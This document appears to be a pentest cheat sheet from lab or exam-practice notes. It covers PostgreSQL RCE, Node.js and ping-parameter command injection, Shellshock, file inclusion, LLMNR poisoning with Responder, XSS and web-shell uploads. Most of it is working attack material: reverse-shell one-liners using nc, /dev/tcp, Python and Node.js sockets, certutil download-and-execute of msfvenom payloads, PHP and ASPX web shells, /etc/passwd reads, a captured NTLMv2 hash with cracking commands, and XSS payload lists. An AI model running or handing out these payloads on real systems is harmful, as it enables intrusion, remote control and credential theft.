
```
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
```


## RCE

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > RCE`

```
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
```


## Searchsploit RCE

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Searchsploit RCE`

```
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
multiple/remote/50847.py
```

```
python3 50847.py -i 192.168.214.47 -p 5437 -c "busybox nc 192.168.45.191 80 -e sh"
```


## Unkown Port / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Unkown Port > Enumeration`

```
nc -nv $IP 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
```

```
help #always run this after your nc -nv command
```


## Passwords Guessed

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Passwords Guessed`

```
root:root
admin@example.com:admin
admin:admin
USERK:USERK #name of the box
cassie:cassie #Found users with exiftool
```


## Nodes.js(express)

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Nodes.js(express)`

```
Send this request through burpsuite
```

[![image](https://private-user-images.githubusercontent.com/127046919/241088020-1957806a-feed-4cbe-8f6f-d475ac99c48a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4MDIwLTE5NTc4MDZhLWZlZWQtNGNiZS04ZjZmLWQ0NzVhYzk5YzQ4YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMzRjMzAzNDFiNTY2MGU5YjE2MGJlMTNjNmQ3N2ZlYzUxYWU2YjJlYjlhODg1ZDBiNTk4YjRiOGNmNjFkODIxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3RGFNkkSSQy7MmfswBGrVLcpBVTCV-oAS6XBiO0gsr0)](https://private-user-images.githubusercontent.com/127046919/241088020-1957806a-feed-4cbe-8f6f-d475ac99c48a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4MDIwLTE5NTc4MDZhLWZlZWQtNGNiZS04ZjZmLWQ0NzVhYzk5YzQ4YS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMzRjMzAzNDFiNTY2MGU5YjE2MGJlMTNjNmQ3N2ZlYzUxYWU2YjJlYjlhODg1ZDBiNTk4YjRiOGNmNjFkODIxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3RGFNkkSSQy7MmfswBGrVLcpBVTCV-oAS6XBiO0gsr0)

```
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1

full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3\`
```

[![image](https://private-user-images.githubusercontent.com/127046919/241088194-2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4MTk0LTJiOGUzNjFhLTRhMmEtNDNiMS1hMmZhLWVkNDFiMmM4YTg0Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNmYxMzVkNTljODI1MWQwZWYzMTQ5ODU2Yjg5ZGNmMTIzNDliNTQzZjMwYWUwY2MzNWUzMjIwY2Y1MWVmZDYzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.rnKBaD4Vp-ps1lhGEAPOwOeoaXONL9V8jRisp5E0ANs)](https://private-user-images.githubusercontent.com/127046919/241088194-2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4MTk0LTJiOGUzNjFhLTRhMmEtNDNiMS1hMmZhLWVkNDFiMmM4YTg0Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNmYxMzVkNTljODI1MWQwZWYzMTQ5ODU2Yjg5ZGNmMTIzNDliNTQzZjMwYWUwY2MzNWUzMjIwY2Y1MWVmZDYzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.rnKBaD4Vp-ps1lhGEAPOwOeoaXONL9V8jRisp5E0ANs)

```
This time add a ;
```

```
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1

full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;
```

[![image](https://private-user-images.githubusercontent.com/127046919/241088274-d9d57594-c10e-4755-b409-16d602a7f5f2.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4Mjc0LWQ5ZDU3NTk0LWMxMGUtNDc1NS1iNDA5LTE2ZDYwMmE3ZjVmMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MWU2MWY1NWYxN2FkYjc2YWRmYjVlNTcwZWQzNWI2MzU5NTI3MTdlZTM1NTZmMjE5MjNlYzgwNTJhODQwODNmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.dp8FcHs99AKXJpKfj7iPczB3Q_vAV9h1CnJn2JQQwVY)](https://private-user-images.githubusercontent.com/127046919/241088274-d9d57594-c10e-4755-b409-16d602a7f5f2.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxMDg4Mjc0LWQ5ZDU3NTk0LWMxMGUtNDc1NS1iNDA5LTE2ZDYwMmE3ZjVmMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MWU2MWY1NWYxN2FkYjc2YWRmYjVlNTcwZWQzNWI2MzU5NTI3MTdlZTM1NTZmMjE5MjNlYzgwNTJhODQwODNmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.dp8FcHs99AKXJpKfj7iPczB3Q_vAV9h1CnJn2JQQwVY)

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.45.191", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

```
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1

full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;(function(){

    var net = require("net"),

        cp = require("child_process"),

        sh = cp.spawn("sh", []);

    var client = new net.Socket();

    client.connect(80, "192.168.45.191", function(){

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    return /a/; // Prevents the Node.js application from crashing

})();
```

```
nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.250] 46956
id
uid=1000(observer) gid=1000(observer) groups=1000(observer)
```


## Shellshock

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Shellshock`

```
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
```

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
```

```
http://10.11.1.35/section.php?page=/etc/passwd
```

[![](https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png)](https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png)


## Shellshock / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Shellshock > Enumeration`

```
userE@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
```

```
http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
```

[![](https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png)](https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png)


## Command Injection / windows

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Command Injection > windows`

For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:

```
&& whoami
```

[![](https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png)](https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png)

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
```


## snmp manager / linux

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Command Injection > snmp manager > linux`

```
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
```

```
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
sudo tcpdump -i any "icmp"  # confirm RCE exploit works or any network traffic
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
```

```
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
```


## http

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > llmnr-poisoning-responder > http`

```
https://juggernaut-sec.com/llmnr-poisoning-responder/
```

```
responder -I tun0 -wv
```

[![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)

```
[+] Listening for events...                                                                                                                                                                                                                 

[HTTP] Sending NTLM authentication request to 192.168.54.165
[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.54.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
```


## SMB

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > llmnr-poisoning-responder > SMB`

```
sudo responder -I tun0 -d -w
```

```
file://///<your $ip>/Share
```

[![image](https://private-user-images.githubusercontent.com/127046919/237831182-a80cb512-fa68-4cf9-a8e1-565d70e52137.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMxMTgyLWE4MGNiNTEyLWZhNjgtNGNmOS1hOGUxLTU2NWQ3MGU1MjEzNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wZTM4NjM2MjRlM2E1ZDJjMzVmMGM1ZjFmYjE1MjExNDg4NGNjZTQzNTBiMjBlYTcyZDU5MGQ5MzA5Nzg0Y2ZlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.LFx810Ab3Ka1wtVfSOjl_JaRRGsW5zYhFoN_scbbFFw)](https://private-user-images.githubusercontent.com/127046919/237831182-a80cb512-fa68-4cf9-a8e1-565d70e52137.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMxMTgyLWE4MGNiNTEyLWZhNjgtNGNmOS1hOGUxLTU2NWQ3MGU1MjEzNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wZTM4NjM2MjRlM2E1ZDJjMzVmMGM1ZjFmYjE1MjExNDg4NGNjZTQzNTBiMjBlYTcyZDU5MGQ5MzA5Nzg0Y2ZlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.LFx810Ab3Ka1wtVfSOjl_JaRRGsW5zYhFoN_scbbFFw)

[![image](https://private-user-images.githubusercontent.com/127046919/237830876-2bb68b1f-70dc-4154-b961-3f42118b8495.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMwODc2LTJiYjY4YjFmLTcwZGMtNDE1NC1iOTYxLTNmNDIxMThiODQ5NS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZDI2YjhkM2UzNzVmZTQ1MzlhMTU2MjE1ZjMzNWU0YzhlNzhkMjM0OTg1YzNhMGU0MDUwMWNlMzJmOWE4YzViJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Fl-Ju_FV6t4eIeI8JX6AkZmrQXRNrPtalHw5xLt61zo)](https://private-user-images.githubusercontent.com/127046919/237830876-2bb68b1f-70dc-4154-b961-3f42118b8495.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjM3ODMwODc2LTJiYjY4YjFmLTcwZGMtNDE1NC1iOTYxLTNmNDIxMThiODQ5NS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iZDI2YjhkM2UzNzVmZTQ1MzlhMTU2MjE1ZjMzNWU0YzhlNzhkMjM0OTg1YzNhMGU0MDUwMWNlMzJmOWE4YzViJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Fl-Ju_FV6t4eIeI8JX6AkZmrQXRNrPtalHw5xLt61zo)

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```


## Hash

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > llmnr-poisoning-responder > SMB > Hash`

```
enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
```


## XSS

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > XSS`

- https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
- https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

1. Basic payload

```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag

```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

- Example source code

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

- After input the payload

```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.

```html
--><script>alert(1)</script>
```

- Example source code

```html
<!-- REFLECTED_HERE --> 
```

- After input the payload

```html
<!-- --><script>alert(1)</script> -->
```

4. Add when the input inside or between opening/closing tags, tag can be `<a>,<title>,<script>` and any other HTML tags

```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

- Example source code

```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

- After input the payload

```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered

```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

- Example source code

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

- After input the payload

```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside `<script>` tags

```html
</script><script>alert(1)</script>
```

- Example source code

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

- After input the payload

```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```


## SSRF

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > SSRF`

SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

[![](https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png)](https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png)


## Example attack

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > SSRF > Example attack`

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
```

```
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Exploitation`

```
cat shell.php                   
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php

http://<$Victim>/site/index.php?page=http://<Your $IP>:80/shell.php&cmd=ping <Your $IP>

tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
20:27:03.538792 IP 192.168.153.53 > 192.168.45.191: ICMP echo request, id 1, seq 1, length 40
20:27:03.539661 IP 192.168.45.191 > 192.168.153.53: ICMP echo reply, id 1, seq 1, length 40
```

```
locate nc.exe
impacket-smbserver -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
```

```
cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
ftp> put cmd-asp-5.1.asp
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
```

```
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp /usr/share/windows-binaries/nc.exe .
ftp> put cmdasp.aspx
impacket-smbserver -smb2support Share .
http://<target $IP>:<port>/cmdasp.aspx
nc -nlvp <port on your kali>
cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
```

We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
```

When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications


## Minitrue

